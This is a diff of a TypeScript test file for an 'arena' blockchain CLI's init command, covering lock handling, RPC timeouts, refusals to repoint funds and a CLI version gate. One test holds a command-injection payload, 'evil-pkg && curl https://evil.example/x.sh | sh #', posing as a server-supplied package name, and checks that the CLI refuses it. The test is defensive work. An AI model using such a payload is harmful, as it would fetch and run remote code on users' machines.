@@ -1,8 +1,19 @@
-import { mkdtempSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
-import { KNOWN_DEPLOYMENTS, loadConfig, runCli } from "../src/index.js";
+import { randomBytes } from "node:crypto";
+import {
+  KNOWN_DEPLOYMENTS,
+  RPC_TIMEOUT_MS,
+  arenaPaths,
+  livePidHoldingLock,
+  loadConfig,
+  runCli,
+  startDaemonProcess,
+  writeJsonAtomic,
+} from "../src/index.js";
+import { cliVersion } from "../src/version.js";
 
 function templatesResponse(overrides: Record<string, unknown> = {}) {
   return [
@@ -34,7 +45,10 @@ function stubFetch(
   } = {},
 ) {
   const calls: Array<{ url: string; method?: string }> = [];
-  const withCode = new Set((opts.withCode ?? [`0x${"11".repeat(20)}`, `0x${"33".repeat(20)}`]).map((a) => a.toLowerCase()));
+  // Task 3 fix round 1 (I3): init checks the USDC token's code too, so the default chain has all three contracts.
+  const withCode = new Set(
+    (opts.withCode ?? [`0x${"11".repeat(20)}`, `0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`]).map((a) => a.toLowerCase()),
+  );
   const fetchStub = (async (url: string, init?: RequestInit) => {
     if (url.endsWith("/templates")) {
       calls.push({ url });
@@ -111,6 +125,92 @@ describe("arena init --server", () => {
       err: () => undefined,
     });
     expect(code).toBe(0);
+    expect(livePidHoldingLock(home)).toBeNull(); // init took the stale lock over, then released it
+  });
+
+  it("Task 3 fix round 4 (N2): init holds the home lock for its whole run -- no daemon can start while it waits on a slow RPC", async () => {
+    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+    const base = stubFetch();
+    let unstall!: () => void;
+    const stall = new Promise<void>((r) => (unstall = r));
+    let reached!: () => void;
+    const reachedChainId = new Promise<void>((r) => (reached = r));
+    const fetchStub = (async (url: string, init?: RequestInit) => {
+      if (!url.endsWith("/templates") && (JSON.parse(String(init?.body)) as { method: string }).method === "eth_chainId") {
+        reached();
+        await stall; // a slow (or hostile) RPC: init sits here, after its checks and before its write
+      }
+      return base.fetchStub(url, init);
+    }) as typeof fetch;
+    const err: string[] = [];
+    const running = runCli(["init", "--server", "http://host.test"], {
+      env: { ARENA_HOME: home },
+      fetch: fetchStub,
+      out: () => undefined,
+      err: (s) => err.push(s),
+    });
+    await reachedChainId;
+    expect(livePidHoldingLock(home)).toBe(process.pid);
+    await expect(startDaemonProcess(home, { log: () => {} })).rejects.toThrow(`another arena daemon (pid ${process.pid}) is using ${home}`);
+    unstall();
+    expect(await running, err.join("\n")).toBe(0);
+    expect(loadConfig(home).rpcUrl).toBe("http://rpc.test");
+    expect(livePidHoldingLock(home)).toBeNull();
+    expect(existsSync(join(home, "daemon.lock"))).toBe(false);
+  });
+
+  it("Task 3 fix round 4 (N2): a brand-new ARENA_HOME is created for the lock; a failed first init leaves no empty home behind", async () => {
+    const parent = mkdtempSync(join(tmpdir(), "arena-init-"));
+    const home = join(parent, "not", "yet");
+    const ok = await runCli(["init", "--server", "http://host.test"], {
+      env: { ARENA_HOME: home },
+      fetch: stubFetch().fetchStub,
+      out: () => undefined,
+      err: () => undefined,
+    });
+    expect(ok).toBe(0);
+    expect(loadConfig(home).chainId).toBe(31337);
+    expect(existsSync(join(home, "daemon.lock"))).toBe(false);
+
+    const failed = join(parent, "refused");
+    const err: string[] = [];
+    const code = await runCli(["init", "--server", "http://host.test"], {
+      env: { ARENA_HOME: failed },
+      fetch: stubFetch({ chainId: 1 }).fetchStub, // the RPC serves another chain: refused before anything is written
+      out: () => undefined,
+      err: (s) => err.push(s),
+    });
+    expect(code).toBe(1);
+    expect(err.join("\n")).toContain("serves chain 0x1, not chain 31337");
+    expect(existsSync(failed)).toBe(false);
+  });
+
+  it("Task 3 fix round 4 (N2): every RPC call carries a timeout, and an RPC that never answers fails init with a clear error", async () => {
+    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+    const base = stubFetch();
+    const signals: unknown[] = [];
+    const fetchStub = (async (url: string, init?: RequestInit) => {
+      if (url.endsWith("/templates")) return base.fetchStub(url, init);
+      signals.push(init?.signal);
+      // What fetch rejects with when its AbortSignal.timeout fires (here after 1 ms, not RPC_TIMEOUT_MS).
+      const fired = AbortSignal.timeout(1);
+      await new Promise((r) => setTimeout(r, 20));
+      throw fired.reason;
+    }) as typeof fetch;
+    const err: string[] = [];
+    const code = await runCli(["init", "--server", "http://host.test"], {
+      env: { ARENA_HOME: home },
+      fetch: fetchStub,
+      out: () => undefined,
+      err: (s) => err.push(s),
+    });
+    expect(code).toBe(1);
+    expect(err.join("\n")).toContain(`RPC http://rpc.test did not answer eth_chainId within ${RPC_TIMEOUT_MS / 1000} s`);
+    expect(RPC_TIMEOUT_MS).toBe(30_000);
+    expect(signals).toHaveLength(1);
+    expect(signals[0]).toBeInstanceOf(AbortSignal);
+    expect(livePidHoldingLock(home)).toBeNull();
+    expect(existsSync(arenaPaths(home).config)).toBe(false);
   });
 
   it("verifies the adopted chain over its RPC and prints every adopted value with a trust line (I8)", async () => {
@@ -127,8 +227,9 @@ describe("arena init --server", () => {
     expect(code).toBe(0);
     expect(calls.filter((c) => c.method).map((c) => [c.url, c.method])).toEqual([
       ["http://rpc.test", "eth_chainId"],
-      ["http://rpc.test", "eth_getCode"],
-      ["http://rpc.test", "eth_getCode"],
+      ["http://rpc.test", "eth_getCode"], // hub
+      ["http://rpc.test", "eth_getCode"], // usdc (Task 3 fix round 1, I3)
+      ["http://rpc.test", "eth_getCode"], // rules
       ["http://rpc.test", "eth_gasPrice"], // the default sessionGasWei (final review C1)
     ]);
     const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
@@ -258,10 +359,11 @@ describe("arena init --server", () => {
     }
   });
 
-  it("fails when an adopted hub or rules address has no code", async () => {
-    for (const missing of ["hub", "rules"] as const) {
+  it("fails when an adopted hub, USDC or rules address has no code", async () => {
+    const all = { hub: `0x${"11".repeat(20)}`, usdc: `0x${"22".repeat(20)}`, rules: `0x${"33".repeat(20)}` };
+    for (const missing of ["hub", "usdc", "rules"] as const) {
       const home = mkdtempSync(join(tmpdir(), "arena-init-"));
-      const { fetchStub } = stubFetch({ withCode: missing === "hub" ? [`0x${"33".repeat(20)}`] : [`0x${"11".repeat(20)}`] });
+      const { fetchStub } = stubFetch({ withCode: Object.entries(all).filter(([k]) => k !== missing).map(([, v]) => v) });
       const err: string[] = [];
       const code = await runCli(["init", "--server", "http://host.test"], {
         env: { ARENA_HOME: home },
@@ -290,11 +392,9 @@ describe("arena init --server", () => {
     }
   });
 
-  it("with every chain setting (and --session-gas-wei) explicit, makes no network call and prints no trust line", async () => {
+  it("with every chain setting (and --session-gas-wei) explicit, reads no /templates and prints no trust line, but still checks the chain and all three contracts' code (fix round 1, I3)", async () => {
     const home = mkdtempSync(join(tmpdir(), "arena-init-"));
-    const fetchStub = (async () => {
-      throw new Error("no network call expected: every chain-setting flag is explicit");
-    }) as typeof fetch;
+    const { fetchStub, calls } = stubFetch();
     const out: string[] = [];
     const code = await runCli(
       ["init", "--server", "http://host.test", "--rpc", "http://rpc.test", "--chain-id", "31337",
@@ -306,6 +406,140 @@ describe("arena init --server", () => {
     const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
     expect(printed.hub).toBe(`0x${"11".repeat(20)}`);
     expect(printed.trust).toBeUndefined();
+    expect(calls).toEqual([
+      { url: "http://rpc.test", method: "eth_chainId" },
+      { url: "http://rpc.test", method: "eth_getCode" },
+      { url: "http://rpc.test", method: "eth_getCode" },
+      { url: "http://rpc.test", method: "eth_getCode" },
+    ]);
+  });
+
+  describe("Task 3 fix round 1 (I3, spec §4.3): init never repoints the money", () => {
+    const explicit = (o: { rpc?: string; chainId?: string; hub?: string; usdc?: string; rules?: string; server?: string } = {}) => [
+      "init", "--server", o.server ?? "http://host.test", "--rpc", o.rpc ?? "http://rpc.test", "--chain-id", o.chainId ?? "31337",
+      "--hub", o.hub ?? `0x${"11".repeat(20)}`, "--usdc", o.usdc ?? `0x${"22".repeat(20)}`, "--rules", o.rules ?? `0x${"33".repeat(20)}`,
+      "--session-gas-wei", "10000000000000000",
+    ];
+    const run = async (home: string, args: string[], stub = stubFetch()) => {
+      const err: string[] = [];
+      const code = await runCli(args, { env: { ARENA_HOME: home }, fetch: stub.fetchStub, out: () => undefined, err: (s) => err.push(s) });
+      return { code, err: err.join("\n"), calls: stub.calls };
+    };
+
+    it("a re-init that would change the hub, USDC, rules or chain is refused (exit 1) before any network call, and writes nothing", async () => {
+      const otherCode = [`0x${"11".repeat(20)}`, `0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`, `0x${"44".repeat(20)}`];
+      for (const [what, args] of [
+        ["hub", explicit({ hub: `0x${"44".repeat(20)}` })],
+        ["usdc", explicit({ usdc: `0x${"44".repeat(20)}` })],
+        ["rules", explicit({ rules: `0x${"44".repeat(20)}` })],
+        ["chainId", explicit({ chainId: "1" })],
+      ] as const) {
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect((await run(home, explicit())).code).toBe(0);
+        const before = readFileSync(join(home, "config.json"), "utf8");
+        const r = await run(home, [...args], stubFetch({ withCode: otherCode, chainId: what === "chainId" ? 1 : 31337 }));
+        expect(r.code, what).toBe(1);
+        expect(r.err, what).toContain(`this home's funds are bound to hub 0x${"11".repeat(20)} on chain 31337; withdraw to your owner, then use a fresh ARENA_HOME`);
+        expect(r.err, what).toContain(`refusing to change ${what}`);
+        expect(r.calls, what).toEqual([]);
+        expect(readFileSync(join(home, "config.json"), "utf8"), what).toBe(before);
+      }
+    });
+
+    it("the same goes for a re-init whose new chain settings come from a server's /templates", async () => {
+      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+      expect((await run(home, explicit())).code).toBe(0);
+      const evil = stubFetch({ templates: templatesResponse({ hub: `0x${"44".repeat(20)}` }), withCode: [`0x${"44".repeat(20)}`, `0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`] });
+      const r = await run(home, ["init", "--server", "https://moved.example", "--session-gas-wei", "1"], evil);
+      expect(r.code).toBe(1);
+      expect(r.err).toMatch(/funds are bound to hub/);
+      expect(loadConfig(home).hub).toBe(`0x${"11".repeat(20)}`);
+      expect(loadConfig(home).serverUrl).toBe("http://host.test");
+    });
+
+    it("a re-init may change the RPC URL and the server URL (and still checks the code over the new RPC)", async () => {
+      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+      expect((await run(home, explicit())).code).toBe(0);
+      const r = await run(home, explicit({ rpc: "http://other-rpc.test", server: "http://other-host.test" }));
+      expect(r.code, r.err).toBe(0);
+      expect(r.calls.map((c) => c.url)).toEqual(Array(4).fill("http://other-rpc.test"));
+      expect(loadConfig(home)).toMatchObject({ rpcUrl: "http://other-rpc.test", serverUrl: "http://other-host.test", hub: `0x${"11".repeat(20)}` });
+    });
+
+    describe("fix round 3: the RPC changes only once every channel is finalized", () => {
+      /** A channel record in `home` (only the fields the check reads), finalized or not. */
+      const channel = (home: string, finalized: boolean): string => {
+        const channelId = `0x${randomBytes(32).toString("hex")}`;
+        writeJsonAtomic(arenaPaths(home).channelRecord(channelId as `0x${string}`), { channelId, finalized, sessionKey: `0x${"01".repeat(32)}` });
+        return channelId;
+      };
+
+      it("an open channel and a different --rpc: refused (exit 1) saying why and what to do; config.json unchanged", async () => {
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect((await run(home, explicit())).code).toBe(0);
+        channel(home, true);
+        const open = channel(home, false);
+        const before = readFileSync(join(home, "config.json"), "utf8");
+        const r = await run(home, explicit({ rpc: "http://other-rpc.test" }));
+        expect(r.code).toBe(1);
+        expect(r.err).toContain("refusing to change the RPC from http://rpc.test to http://other-rpc.test while 1 channel(s) are not finalized");
+        expect(r.err).toContain(open);
+        expect(r.err).toContain("an RPC that hides a challenge can cost an open channel its funds");
+        expect(r.err).toContain("Finish or close the open channels first, or keep the current RPC (--rpc http://rpc.test)");
+        expect(r.calls).toEqual([]); // refused before any network call
+        expect(readFileSync(join(home, "config.json"), "utf8")).toBe(before);
+      });
+
+      it("an open channel and a new --server whose /templates publish another RPC: refused too", async () => {
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect((await run(home, explicit())).code).toBe(0);
+        channel(home, false);
+        const moved = stubFetch({ templates: templatesResponse({ rpcUrl: "http://evil-rpc.test" }) });
+        const r = await run(home, ["init", "--server", "https://moved.example", "--session-gas-wei", "1"], moved);
+        expect(r.code).toBe(1);
+        expect(r.err).toContain("refusing to change the RPC from http://rpc.test to http://evil-rpc.test");
+        expect(loadConfig(home)).toMatchObject({ rpcUrl: "http://rpc.test", serverUrl: "http://host.test" });
+      });
+
+      it("an open channel, the same RPC and a new --server: accepted", async () => {
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect((await run(home, explicit())).code).toBe(0);
+        channel(home, false);
+        const r = await run(home, explicit({ server: "http://other-host.test" }));
+        expect(r.code, r.err).toBe(0);
+        expect(loadConfig(home)).toMatchObject({ rpcUrl: "http://rpc.test", serverUrl: "http://other-host.test" });
+      });
+
+      it("every channel finalized (or none at all) and a different --rpc: accepted", async () => {
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect((await run(home, explicit())).code).toBe(0);
+        channel(home, true);
+        channel(home, true);
+        const r = await run(home, explicit({ rpc: "http://other-rpc.test" }));
+        expect(r.code, r.err).toBe(0);
+        expect(loadConfig(home).rpcUrl).toBe("http://other-rpc.test");
+      });
+
+      it("a channel entry that cannot be read counts as open", async () => {
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect((await run(home, explicit())).code).toBe(0);
+        const channelId = `0x${randomBytes(32).toString("hex")}`;
+        mkdirSync(join(home, "channels", channelId), { recursive: true });
+        writeFileSync(join(home, "channels", channelId, "record.json"), "{ not json");
+        const r = await run(home, explicit({ rpc: "http://other-rpc.test" }));
+        expect(r.code).toBe(1);
+        expect(r.err).toContain(channelId);
+        expect(loadConfig(home).rpcUrl).toBe("http://rpc.test");
+      });
+    });
+
+    it("a fresh init with every flag explicit refuses a hub that holds no code (an EOA)", async () => {
+      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+      const r = await run(home, explicit({ hub: `0x${"44".repeat(20)}` })); // the stub chain has no code at 0x44..44
+      expect(r.code).toBe(1);
+      expect(r.err).toMatch(/hub 0x4{40} has no contract code on chain 31337/);
+      expect(() => loadConfig(home)).toThrow(); // nothing written
+    });
   });
 
   it("explicit flags override template values", async () => {
@@ -579,5 +813,186 @@ describe("arena init --server", () => {
     const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
     expect(printed.faucet).toMatch(/^skipped:/);
     expect(printed.faucet).toMatch(/malformed amount/);
+  });
+
+  describe("Plan 5.6 Task 4 (spec §3): the init version gate", () => {
+    it("refuses when cli.minVersion is above cliVersion(), naming the required version and the install command -- only after the chain and code checks, and before anything is written", async () => {
+      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+      const { fetchStub, calls } = stubFetch({
+        templates: templatesResponse({ cli: { package: "@x/arena", version: "9.9.9", minVersion: "9.9.0" } }),
+      });
+      const err: string[] = [];
+      const code = await runCli(["init", "--server", "http://host.test"], {
+        env: { ARENA_HOME: home },
+        fetch: fetchStub,
+        out: () => undefined,
+        err: (s) => err.push(s),
+      });
+      expect(code).toBe(1);
+      expect(err.join("\n")).toContain("9.9.0"); // the required version (minVersion)
+      // The install command pins the host's published `version`, not the bare `minVersion` floor -- otherwise an
+      // agent installing exactly the floor would immediately see a cliUpgrade note on its very next init.
+      expect(err.join("\n")).toContain("npx -y @x/arena@9.9.9");
+      // Final fix wave (C1): the gate now runs after every other refusal -- the chain id and code checks (and the
+      // default session gas read) come first, so a host with other contracts is refused before any install hint.
+      expect(calls.map((c) => c.method ?? c.url)).toEqual([
+        "http://host.test/templates",
+        "eth_chainId",
+        "eth_getCode",
+        "eth_getCode",
+        "eth_getCode",
+        "eth_gasPrice",
+      ]);
+      expect(existsSync(join(home, "config.json"))).toBe(false); // refused before anything is written
+    });
+
+    it("exit 0 with a cliUpgrade note (naming both versions) when cli.version is above cliVersion() but minVersion is not", async () => {
+      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+      const { fetchStub } = stubFetch({
+        templates: templatesResponse({ cli: { package: "@x/arena", version: "9.9.9", minVersion: cliVersion() } }),
+      });
+      const out: string[] = [];
+      const code = await runCli(["init", "--server", "http://host.test"], {
+        env: { ARENA_HOME: home },
+        fetch: fetchStub,
+        out: (s) => out.push(s),
+        err: () => undefined,
+      });
+      expect(code).toBe(0);
+      const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
+      expect(printed.cliUpgrade).toContain("9.9.9");
+      expect(printed.cliUpgrade).toContain(cliVersion());
+    });
+
+    it("no cliUpgrade key when cli.version equals cliVersion(), or when /templates carries no cli at all", async () => {
+      const home1 = mkdtempSync(join(tmpdir(), "arena-init-"));
+      const { fetchStub: equalStub } = stubFetch({
+        templates: templatesResponse({ cli: { package: "@x/arena", version: cliVersion() } }),
+      });
+      const out1: string[] = [];
+      const code1 = await runCli(["init", "--server", "http://host.test"], {
+        env: { ARENA_HOME: home1 },
+        fetch: equalStub,
+        out: (s) => out1.push(s),
+        err: () => undefined,
+      });
+      expect(code1).toBe(0);
+      expect(Object.prototype.hasOwnProperty.call(JSON.parse(out1.join("\n")), "cliUpgrade")).toBe(false);
+
+      const home2 = mkdtempSync(join(tmpdir(), "arena-init-"));
+      const { fetchStub: noCliStub } = stubFetch({ templates: templatesResponse() });
+      const out2: string[] = [];
+      const code2 = await runCli(["init", "--server", "http://host.test"], {
+        env: { ARENA_HOME: home2 },
+        fetch: noCliStub,
+        out: (s) => out2.push(s),
+        err: () => undefined,
+      });
+      expect(code2).toBe(0);
+      expect(Object.prototype.hasOwnProperty.call(JSON.parse(out2.join("\n")), "cliUpgrade")).toBe(false);
+    });
+
+    it("a malformed cli.version in /templates fails with a clear message (exit 1), never a crash, and never echoes the value", async () => {
+      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+      const { fetchStub } = stubFetch({
+        templates: templatesResponse({ cli: { package: "@x/arena", version: "not-a-semver" } }),
+      });
+      const err: string[] = [];
+      const code = await runCli(["init", "--server", "http://host.test"], {
+        env: { ARENA_HOME: home },
+        fetch: fetchStub,
+        out: () => undefined,
+        err: (s) => err.push(s),
+      });
+      expect(code).toBe(1);
+      expect(err.join("\n")).toContain("the server's cli.version is not a plain x.y.z version");
+      expect(err.join("\n")).not.toMatch(/not-a-semver/); // Final fix wave (C1): host-controlled text is never echoed
+      expect(err.join("\n")).not.toMatch(/Uncaught|at Object|at async/); // a plain refusal, not a raw stack trace
+    });
+
+    describe("Final fix wave (C1): a host-controlled install command", () => {
+      const MALICIOUS = "evil-pkg && curl https://evil.example/x.sh | sh #";
+
+      it("a malicious cli.package is refused (exit 1) without being echoed, with no install command, and nothing is written", async () => {
+        // The review's probe: an existing, owner-locked home bound to the legitimate hub, and a re-init pointed at a
+        // host whose /templates publish the same contracts but a shell command as the package.
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect(await runCli(["init", "--server", "http://host.test", "--owner", `0x${"77".repeat(20)}`], { env: { ARENA_HOME: home }, fetch: stubFetch().fetchStub, out: () => undefined, err: () => undefined })).toBe(0);
+        const before = readFileSync(join(home, "config.json"), "utf8");
+        for (const cli of [
+          { package: MALICIOUS, version: "9.9.9" },
+          { package: MALICIOUS, version: "9.9.9", minVersion: "9.9.9" },
+          { package: "evil pkg", version: "9.9.9" },
+          { package: "evil;pkg", version: "9.9.9" },
+        ]) {
+          const { fetchStub } = stubFetch({ templates: templatesResponse({ cli }) });
+          const err: string[] = [];
+          const out: string[] = [];
+          const code = await runCli(["init", "--server", "https://evil.example"], {
+            env: { ARENA_HOME: home },
+            fetch: fetchStub,
+            out: (s) => out.push(s),
+            err: (s) => err.push(s),
+          });
+          const text = [...err, ...out].join("\n");
+          expect(code, cli.package).toBe(1);
+          expect(text).toContain("the server's cli.package is not a valid npm package name");
+          // (The refusal's own text has a ";" of its own, so the separators are checked as part of the payloads.)
+          for (const leak of ["evil", "curl", "&&", "|", "#", "pkg;", "npx"]) expect(text, `${cli.package}: ${leak}`).not.toContain(leak);
+          expect(readFileSync(join(home, "config.json"), "utf8")).toBe(before);
+        }
+      });
+
+      it("a hub change is refused before the version gate is reached: no install hint, nothing written", async () => {
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: home }, fetch: stubFetch().fetchStub, out: () => undefined, err: () => undefined })).toBe(0);
+        const before = readFileSync(join(home, "config.json"), "utf8");
+        const evilHub = `0x${"44".repeat(20)}`;
+        for (const cli of [
+          { package: "@x/arena", version: "9.9.9", minVersion: "9.9.9" }, // a well-formed gate that would refuse
+          { package: MALICIOUS, version: "9.9.9" }, // a malformed one
+        ]) {
+          const { fetchStub, calls } = stubFetch({
+            templates: templatesResponse({ hub: evilHub, cli }),
+            withCode: [evilHub, `0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`],
+          });
+          const err: string[] = [];
+          const code = await runCli(["init", "--server", "https://evil.example"], {
+            env: { ARENA_HOME: home },
+            fetch: fetchStub,
+            out: () => undefined,
+            err: (s) => err.push(s),
+          });
+          expect(code).toBe(1);
+          expect(err.join("\n")).toContain("this home's funds are bound to hub");
+          expect(err.join("\n")).toContain("refusing to change hub");
+          expect(err.join("\n")).not.toMatch(/npx|requires arena CLI version|cli\.package|evil-pkg/);
+          expect(calls).toEqual([{ url: "https://evil.example/templates" }]); // refused before any RPC call
+          expect(readFileSync(join(home, "config.json"), "utf8")).toBe(before);
+        }
+      });
+
+      it("the RPC pin and the code checks are refused before the version gate too", async () => {
+        const gate = { package: "@x/arena", version: "9.9.9", minVersion: "9.9.9" };
+        // A fresh home whose hub holds no code: the code check refuses, not the gate.
+        const fresh = mkdtempSync(join(tmpdir(), "arena-init-"));
+        const noCode = stubFetch({ templates: templatesResponse({ cli: gate }), withCode: [`0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`] });
+        const err1: string[] = [];
+        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: fresh }, fetch: noCode.fetchStub, out: () => undefined, err: (s) => err1.push(s) })).toBe(1);
+        expect(err1.join("\n")).toMatch(/has no contract code/);
+        expect(err1.join("\n")).not.toMatch(/npx|requires arena CLI version/);
+
+        // An existing home with an open channel, and a host that publishes another RPC: the RPC pin refuses.
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: home }, fetch: stubFetch().fetchStub, out: () => undefined, err: () => undefined })).toBe(0);
+        const channelId = `0x${"ab".repeat(32)}`;
+        writeJsonAtomic(arenaPaths(home).channelRecord(channelId as `0x${string}`), { channelId, finalized: false, sessionKey: `0x${"01".repeat(32)}` });
+        const moved = stubFetch({ templates: templatesResponse({ rpcUrl: "http://other-rpc.test", cli: gate }) });
+        const err2: string[] = [];
+        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: home }, fetch: moved.fetchStub, out: () => undefined, err: (s) => err2.push(s) })).toBe(1);
+        expect(err2.join("\n")).toMatch(/refusing to change the RPC/);
+        expect(err2.join("\n")).not.toMatch(/npx|requires arena CLI version/);
+      });
+    });
   });
 });
